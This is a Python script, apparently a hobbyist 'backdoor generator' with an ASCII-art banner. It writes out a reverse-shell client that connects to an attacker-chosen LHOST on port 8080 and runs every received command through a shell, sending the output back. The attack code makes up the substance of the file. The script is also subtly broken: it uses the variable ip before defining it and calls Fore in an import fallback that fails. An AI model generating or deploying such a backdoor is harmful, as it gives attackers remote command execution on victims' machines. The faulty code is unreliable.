#!/usr/bin/env python3
# Author: Gr3n0xX
# Python backdoor generator 
try:
    import sys
    import os
    import time
    from colorama import Fore, Back, Style
except ModuleNotFoundError:
    print(Fore.RED + '[!] I require colorama, install it')
    sys.exit()
except KeyboardInterrupt:
    print(Fore.RED + '[!] Exiting.')
    sys.exit()
if sys.version_info[0] < 3:
    print("\033[1m\033[93m[!] Please run the tool using Python 3")
    sys.exit()


    
def banner():
    os.system("clear")
    print (Fore.BLUE + """

           _________
         /'        /|
        /         / |_
       /         /  //|
      /_________/  ////|
     |   _ _    | 8o////|
     | /'// )_  |   8///|
     |/ // // ) |   8o///|
     / // // //,|  /  8//|
    / // // /// | /   8//|
   / // // ///__|/    8//|
  /.(_)// /// |       8///|
 (_)' `(_)//| |       8////|___________
(_) /_\ (_)'| |        8///////////////
(_) \_/ (_)'|_|         8/////////////
 (_)._.(_) d' Hb         8oooooooopb'
   `(_)'  d'  H`b       -------------------
         d'   `b`b      |    BACKDOOR     |
        d'     H `b     |    Generator    |
       d'      `b `b    |     AUTHOR:     |
      d'           `b   |    Gr3n0xX      |
     d'             `b  |                 |
                        -------------------

Visit https://github.com/grenoxx For More Tools:""")

def finish():
    print ("[*] Generating...")
    os.system("clear")
    print ("1%")
    time.sleep(1.9)
    os.system("clear")
    print ("15%")
    time.sleep(1.9)
    os.system("clear")
    print ("30%")
    time.sleep(1.9)
    os.system("clear")
    print ("50%")
    time.sleep(1.9)
    os.system("clear")
    print ("100%")
    time.sleep(3)
    
temp = """
import socket
import subprocess
import os
import sys

LHOST = """ + ip + """ # Change
LPORT = 8080
client = socket.socket()
print("[-] Connection Initiating...")

try:
    client.connect((LHOST, LPORT))
    print("[-] Connection initiated!")
    
except ConnectionRefusedError:
    os.system("clear")
    print("[!] Connection refused, check IpAddres or see if the port you selected is open...")
    sys.exit()
    
except TimeoutError:
    os.system("clear")
    print("[!] Connection refused")
    sys.exit()

except KeyboardInterrupt:
    os.system("clear")
    print("[!] Shutdown")
    sys.exit()

while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)
    """
    
banner()
file_name = input("[!] Insert a file name.py: ")
ip = input("[!] Select Your LHOST")
arq = open(file_name, 'w')
finish()
arq.write(temp + "\n")
os.system("clear")
print ("[*] Finish!!!")
